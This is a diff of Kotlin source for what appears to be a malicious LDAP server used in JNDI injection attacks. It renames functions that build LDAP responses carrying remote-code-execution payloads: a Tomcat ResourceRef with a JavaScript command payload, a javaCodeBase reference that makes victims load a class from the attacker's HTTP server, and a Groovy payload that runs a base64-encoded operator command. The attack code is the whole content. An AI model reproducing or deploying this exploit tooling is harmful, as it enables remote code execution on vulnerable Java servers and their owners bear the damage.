@@ -8,10 +8,9 @@ import org.apache.naming.ResourceRef
 import util.Options
 import util.base46cmd
 import util.serialize
-import java.net.URL
 import javax.naming.StringRefAddr
 
-fun LDAPServer.execByTomcat(result: InMemoryInterceptedSearchResult, base: String) {
+fun LDAPServer.tomcat(result: InMemoryInterceptedSearchResult, base: String) {
     val jsStr = """
         var strs=new Array(3);
         if(java.io.File.separator.equals('/')) {
@@ -42,7 +41,7 @@ fun LDAPServer.execByTomcat(result: InMemoryInterceptedSearchResult, base: Strin
         add(StringRefAddr("x", payload))
     }
     val entry = Entry(base).apply {
-        addAttribute("javaClassName", "java.lang.String")  // could be any
+        addAttribute("javaClassName", "java.lang.String")
         addAttribute("javaSerializedData", serialize(ref))
     }
 
@@ -50,16 +49,15 @@ fun LDAPServer.execByTomcat(result: InMemoryInterceptedSearchResult, base: Strin
     result.result = LDAPResult(0, ResultCode.SUCCESS)
 }
 
-fun LDAPServer.execByRef(result: InMemoryInterceptedSearchResult, base: String) {
-    val classloaderUrl = "http://${Options.address}:${Options.httpPort}/"
+fun LDAPServer.ref(result: InMemoryInterceptedSearchResult, base: String) {
+    val codeBaseUrl = "http://${Options.address}:${Options.httpPort}/"
 
     val entry = Entry(base)
     val javaFactory = base.substringAfterLast("/")
 
-//    val url = URL("$classloaderUrl$javaFactory.class")
     entry.run {
         addAttribute("javaClassName", "foo")
-        addAttribute("javaCodeBase", classloaderUrl)
+        addAttribute("javaCodeBase", codeBaseUrl)
         addAttribute("objectClass", "javaNamingReference")
         addAttribute("javaFactory", javaFactory)
     }
@@ -69,7 +67,7 @@ fun LDAPServer.execByRef(result: InMemoryInterceptedSearchResult, base: String) 
     }
 }
 
-fun LDAPServer.execByGroovy(result: InMemoryInterceptedSearchResult, base: String) {
+fun LDAPServer.groovy(result: InMemoryInterceptedSearchResult, base: String) {
     val payload = "'${base46cmd(Options.command)}'.execute()"
 
     val ref = ResourceRef(
@@ -80,7 +78,7 @@ fun LDAPServer.execByGroovy(result: InMemoryInterceptedSearchResult, base: Strin
         add(StringRefAddr("x", payload))
     }
     val entry = Entry(base).apply {
-        addAttribute("javaClassName", "java.lang.String")  // could be any
+        addAttribute("javaClassName", "java.lang.String")
         addAttribute("javaSerializedData", serialize(ref))
     }
 
